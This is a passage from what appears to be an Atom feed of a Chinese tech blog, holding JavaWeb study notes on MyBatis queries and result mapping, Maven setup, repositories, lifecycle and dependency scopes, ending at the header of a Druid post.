string">'三只松鼠股份有限公司'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">'好吃不上火'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token punctuation">(</span><span class="token string">'华为'</span><span class="token punctuation">,</span> <span class="token string">'华为技术有限公司'</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token string">'华为致力于把数字世界带入每个人、每个家庭、每个组织，构建万物互联的智能世界'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>       <span class="token punctuation">(</span><span class="token string">'小米'</span><span class="token punctuation">,</span> <span class="token string">'小米科技有限公司'</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token string">'are you ok'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> tb_brand<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="51-查询所有数据"><a class="markdownIt-Anchor" href="#51-查询所有数据">#</a> 5.1 查询所有数据</h2><ol><li>编写接口方法：Mapper 接口<ul><li>参数：无</li><li>结果：List&lt;Brand&gt;</li></ul></li><li>编写 SQL 语句：SQL 映射文件</li><li>执行方法，测试</li></ol><ul><li><p>核心内容：SQL 语句怎么写，参数要什么，结果怎么处理</p></li><li><p>碰到的问题：数据库表的字段名称和实体类的属性名称不一样，则不能自动封装数据</p><ul><li><p>解决方法:</p><ol><li><p>起别名，对不一样的列明起别名，让列名和属性名一样</p></li><li><p>定义 SQL 片段</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sql</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand_column<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    id,brand_name as brandName,company_name as companyName,ordered,description,status<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sql</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultType</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    select        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>include</span> <span class="token attr-name">refid</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand_column<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    from tb_brand;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>resultMap</p><ul><li>id：唯一标识</li><li>type：映射的类型，支持别名</li><li>字标签：id：完成主键字段的映射</li><li>字标签：result：完成一般字段的映射</li><li>属性：column（列名），property（实体类的属性名）</li></ul><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>resultMap</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brandResultMap<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brand_name<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brandName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>result</span> <span class="token attr-name">column</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>company_name<span class="token punctuation">"</span></span> <span class="token attr-name">property</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>companyName<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>resultMap</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>select</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>selectAll<span class="token punctuation">"</span></span> <span class="token attr-name">resultMap</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>brandResultMap<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        select            *        from tb_brand;    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>select</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ul></li></ul><h2 id="52-查询-查看详情"><a class="markdownIt-Anchor" href="#52-查询-查看详情">#</a> 5.2 查询 - 查看详情</h2><ul><li>参数占位符：<ul><li>#{}：使用预编译，将其替换为？，为防止 SQL 注入</li><li>${}：直接拼接参数，会存在 SQL 注入问题</li></ul></li><li>使用时机：<ul><li>传递参数的时候：#{}</li><li>表名或者列名不固定的情况下：${}，但是只要用 $ 就会存在注入问题</li></ul></li><li>特殊字符处理<ol><li>转义字符：xml 转义字符</li><li>CDATA 区：CD 补全</li></ol></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-mybatis概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-mybatis概述&quot;&gt;#&lt;/a&gt; 1、Mybatis 概述&lt;/h1&gt;
&lt;h2 id=&quot;11-mybatis概念&quot;&gt;&lt;a class=&quot;markdownIt-Anc</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb-Maven</title>
    <link href="http://example.com/post/JavaWeb-Maven.html"/>
    <id>http://example.com/post/JavaWeb-Maven.html</id>
    <published>2022-06-23T13:37:21.000Z</published>
    <updated>2022-06-23T13:42:28.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-maven概述"><a class="markdownIt-Anchor" href="#1-maven概述">#</a> 1、Maven 概述</h1><ul><li>Maven 是专门用于管理和构建 Java 项目的工具，它的主要功能有：<ul><li>提供了一套标准化的项目结构</li><li>提供了一套标准化的构建流程（编译、测试、打包、发布）</li><li>提供了一套依赖管理机制</li></ul></li><li>标准化项目结构：</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622203730699.png" alt="image-20220622203730699"></p><ul><li>标准化构建流程：</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622203828981.png" alt="image-20220622203828981"></p><ul><li>提供了一套依赖管理机制</li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622204124033.png" alt="image-20220622204124033"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li>Maven 简介</li><li>Maven 安装配置</li><li>Maven 基本使用</li><li>IDEA 配置 Maven</li><li>依赖管理</li></ul></blockquote><h1 id="2-maven简介"><a class="markdownIt-Anchor" href="#2-maven简介">#</a> 2、Maven 简介</h1><ul><li>Apache Maven 是一个项目管理和构建工具，它基于项目对象模型（POM）的概念，通过一小段描述信息来管理项目的构建、报告和文档</li><li>官网：<a href="http://maven.apache.org/">http://maven.apache.org/</a></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><ul><li>项目对象模型 (Project Object Model)</li><li>依赖管理模型 (Dependency)</li><li>插件 (Plugin)</li></ul></blockquote><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220622204621330.png" alt="image-20220622204621330"></p><ul><li>仓库分类<ul><li>本地仓库：自己计算机上的目录</li><li>中央仓库：由 Maven 团队维护的全球唯一的仓库<ul><li>地址：<a href="https://repo1.maven.org/maven2/">https://repo1.maven.org/maven2/</a></li></ul></li><li>远程仓库：一般由公司团队搭建的私有仓库</li></ul></li><li>写了一个依赖后 Maven 会先到本地仓库找，本地仓库如果没有会去中央仓库找，中央仓库找到之后会将这个依赖 jar 包下载到本地仓库，如果架设了私服，会先到私服找，私服再找不到然后去中央仓库找</li></ul><h1 id="3-maven安装与配置"><a class="markdownIt-Anchor" href="#3-maven安装与配置">#</a> 3、Maven 安装与配置</h1><ol><li>解压 apache-maven 即为安装完成</li><li>配置环境变量 MAVEN-HOME 为安装路径的 bin 目录</li><li>配置本地仓库：修改 conf/settings.xml 中的 &lt;localRepository&gt; 为一个指定目录</li><li>配置阿里云私服：修改 conf/settings.xml 中的 &lt;mirrors&gt; 标签，为其添加如下子标签</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;mirror&gt;&lt;id&gt;alimaven&lt;&#x2F;id&gt;&lt;name&gt;aliyun maven&lt;&#x2F;name&gt;&lt;url&gt;http:&#x2F;&#x2F;maven.aliyun.com&#x2F;nexus&#x2F;content&#x2F;groups&#x2F;public&#x2F;&lt;&#x2F;url&gt;&lt;mirrorOf&gt;central&lt;&#x2F;mirrorOf&gt;&lt;&#x2F;mirror&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="4-maven的基本使用"><a class="markdownIt-Anchor" href="#4-maven的基本使用">#</a> 4、Maven 的基本使用</h1><h2 id="41-maven常用命令"><a class="markdownIt-Anchor" href="#41-maven常用命令">#</a> 4.1 Maven 常用命令</h2><ul><li><p>compile：编译</p></li><li><p>clean：清理</p></li><li><p>test：测试</p></li><li><p>package：打包</p></li><li><p>install：安装</p></li></ul><h2 id="42-maven生命周期"><a class="markdownIt-Anchor" href="#42-maven生命周期">#</a> 4.2 Maven 生命周期</h2><ul><li>Maven 构建项目生命周期描述的是一次构建过程经历了多少事件</li><li>Maven 对项目构建的生命周期划分为 3 套<ul><li>clean：清理工作</li><li>default：核心工作，例如编译、测试、打包、安装等</li><li>site：产生报告，发布站点等</li></ul></li></ul><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623061028050.png" alt="image-20220623061028050"></p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623061136036.png" alt="image-20220623061136036"></p><h1 id="5-idea配置maven"><a class="markdownIt-Anchor" href="#5-idea配置maven">#</a> 5、IDEA 配置 Maven</h1><h2 id="51-idea配置maven环境"><a class="markdownIt-Anchor" href="#51-idea配置maven环境">#</a> 5.1 IDEA 配置 Maven 环境</h2><p>我们需要先在 IDEA 中配置 Maven 环境：</p><ul><li><p>选择 IDEA 中 File --&gt; Settings</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174202898.png" alt="image-20210726174202898" style="zoom:80%;" /></li><li><p>搜索 maven</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174229396.png" alt="image-20210726174229396" style="zoom:80%;" /></li><li><p>设置 IDEA 使用本地安装的 Maven，并修改配置文件路径</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174248050.png" alt="image-20210726174248050" style="zoom:70%;" /></li></ul><h2 id="52-maven坐标详解"><a class="markdownIt-Anchor" href="#52-maven坐标详解">#</a> 5.2 Maven 坐标详解</h2><p><strong>什么是坐标？</strong></p><ul><li>Maven 中的坐标是<mark>资源的唯一标识</mark></li><li>使用坐标来定义项目或引入项目中需要的依赖</li></ul><p><strong>Maven 坐标主要组成</strong></p><ul><li>groupId：定义当前 Maven 项目隶属组织名称（通常是域名反写，例如：com.itheima）</li><li>artifactId：定义当前 Maven 项目名称（通常是模块名称，例如 order-service、goods-service）</li><li>version：定义当前项目版本号</li></ul><p>如下图就是使用坐标表示一个项目：</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726174718176.png" alt="image-20210726174718176"></p><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p><mark>注意：</mark></p><ul><li>上面所说的资源可以是插件、依赖、当前项目。</li><li>我们的项目如果被其他的项目依赖时，也是需要坐标来引入的。</li></ul></blockquote><h2 id="53-创建maven项目"><a class="markdownIt-Anchor" href="#53-创建maven项目">#</a> 5.3 创建 Maven 项目</h2><p>File-&gt;Project Structure-&gt;Modules-&gt;±&gt;New module</p><p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20220623062518499.png" alt="image-20220623062518499"></p><h2 id="54-导入maven项目"><a class="markdownIt-Anchor" href="#54-导入maven项目">#</a> 5.4 导入 Maven 项目</h2><p>大家在学习时可能需要看老师的代码，当然也就需要将老师的代码导入到自己的 IDEA 中。我们可以通过以下步骤进行项目的导入：</p><ul><li><p>选择右侧 Maven 面板，点击 + 号</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726182702336.png" alt="image-20210726182702336" style="zoom:70%;" /></li><li><p>选中对应项目的 pom.xml 文件，双击即可</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726182648891.png" alt="image-20210726182648891" style="zoom:70%;" /></li></ul><p><strong>配置 Maven-Helper 插件</strong></p><ul><li><p>选择 IDEA 中 File --&gt; Settings</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192212026.png" alt="image-20210726192212026" style="zoom:80%;" /></li><li><p>选择 Plugins</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192224914.png" alt="image-20210726192224914" style="zoom:80%;" /></li><li><p>搜索 Maven，选择第一个 Maven Helper，点击 Install 安装，弹出面板中点击 Accept</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192244567.png" alt="image-20210726192244567" style="zoom:80%;" /></li><li><p>重启 IDEA</p></li></ul><p>安装完该插件后可以通过 选中项目右键进行相关命令操作，如下图所示：</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726192430371.png" alt="image-20210726192430371" style="zoom:80%;" /><h1 id="6-依赖管理"><a class="markdownIt-Anchor" href="#6-依赖管理">#</a> 6、依赖管理</h1><h2 id="61-使用坐标引入jar包"><a class="markdownIt-Anchor" href="#61-使用坐标引入jar包">#</a> 6.1  使用坐标引入 jar 包</h2><p><strong>使用坐标引入 jar 包的步骤：</strong></p><ul><li><p>在项目的 pom.xml 中编写 <dependencies> 标签</p></li><li><p>在 <dependencies> 标签中 使用 <dependency> 引入坐标</p></li><li><p>定义坐标的 groupId，artifactId，version</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193105765.png" alt="image-20210726193105765" style="zoom:70%;" /></li><li><p>点击刷新按钮，使坐标生效</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193121384.png" alt="image-20210726193121384" style="zoom:60%;" /></li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注意：</p><ul><li>具体的坐标我们可以到如下网站进行搜索</li><li><a href="https://mvnrepository.com/">https://mvnrepository.com/</a></li></ul></blockquote><p><strong>快捷方式导入 jar 包的坐标：</strong></p><p>每次需要引入 jar 包，都去对应的网站进行搜索是比较麻烦的，接下来给大家介绍一种快捷引入坐标的方式</p><ul><li><p>在 pom.xml 中 按 alt + insert，选择 Dependency</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193603724.png" alt="image-20210726193603724" style="zoom:60%;" /></li><li><p>在弹出的面板中搜索对应坐标，然后双击选中对应坐标</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193625229.png" alt="image-20210726193625229" style="zoom:60%;" /></li><li><p>点击刷新按钮，使坐标生效</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193121384.png" alt="image-20210726193121384" style="zoom:60%;" /></li></ul><p><strong>自动导入设置：</strong></p><p>上面每次操作都需要点击刷新按钮，让引入的坐标生效。当然我们也可以通过设置让其自动完成</p><ul><li><p>选择 IDEA 中 File --&gt; Settings</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193854438.png" alt="image-20210726193854438" style="zoom:60%;" /></li><li><p>在弹出的面板中找到 Build Tools</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726193909276.png" alt="image-20210726193909276" style="zoom:80%;" /></li><li><p>选择 Any changes，点击 ok 即可生效</p></li></ul><h2 id="62-依赖范围"><a class="markdownIt-Anchor" href="#62-依赖范围">#</a> 6.2  依赖范围</h2><p>通过设置坐标的依赖范围 (scope)，可以设置 对应 jar 包的作用范围：编译环境、测试环境、运行环境。</p><p>如下图所示给  <code>junit</code>  依赖通过  <code>scope</code>  标签指定依赖的作用范围。 那么这个依赖就只能作用在测试环境，其他环境下不能使用。</p><img src="http://wuriteup.oss-cn-qingdao.aliyuncs.com/img/image-20210726194703845.png" alt="image-20210726194703845" style="zoom:70%;" /><p>那么  <code>scope</code>  都可以有哪些取值呢？</p><table><thead><tr><th><strong>依赖范围</strong></th><th>编译 classpath</th><th>测试 classpath</th><th>运行 classpath</th><th>例子</th></tr></thead><tbody><tr><td><strong>compile</strong></td><td>Y</td><td>Y</td><td>Y</td><td>logback</td></tr><tr><td><strong>test</strong></td><td>-</td><td>Y</td><td>-</td><td>Junit</td></tr><tr><td><strong>provided</strong></td><td>Y</td><td>Y</td><td>-</td><td>servlet-api</td></tr><tr><td><strong>runtime</strong></td><td>-</td><td>Y</td><td>Y</td><td>jdbc 驱动</td></tr><tr><td><strong>system</strong></td><td>Y</td><td>Y</td><td>-</td><td>存储在本地的 jar 包</td></tr></tbody></table><ul><li>compile ：作用于编译环境、测试环境、运行环境。</li><li>test ： 作用于测试环境。典型的就是 Junit 坐标，以后使用 Junit 时，都会将 scope 指定为该值</li><li>provided ：作用于编译环境、测试环境。我们后面会学习  <code>servlet-api</code>  ，在使用它时，必须将  <code>scope</code>  设置为该值，不然运行时就会报错</li><li>runtime  ： 作用于测试环境、运行环境。jdbc 驱动一般将  <code>scope</code>  设置为该值，当然不设置也没有任何问题</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>注意：</p><ul><li>如果引入坐标不指定  <code>scope</code>  标签时，默认就是 compile  值。以后大部分 jar 包都是使用默认值。</li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-maven概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-maven概述&quot;&gt;#&lt;/a&gt; 1、Maven 概述&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Maven 是专门用于管理和构建 Java 项目的工具，它的主要功能有：
&lt;ul&gt;
&lt;</summary>
      
    
    
    
    <category term="JavaWeb" scheme="http://example.com/categories/JavaWeb/"/>
    
    
    <category term="JavaWeb" scheme="http://example.com/tags/JavaWeb/"/>
    
  </entry>
  
  <entry>
    <title>druid配置详解</title>
    <link href="http://example.com/post/druid%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3.html"/>
    <id>http://example.com/post/druid%E9%85%8D%E7%BD%AE%E8%AF%A6%E8%A7%A3.html</id>
    <published>2022-06-22T12:57:50.000Z</published>
    <updated>2022-06-22T13:02:42.991Z</updated>
    
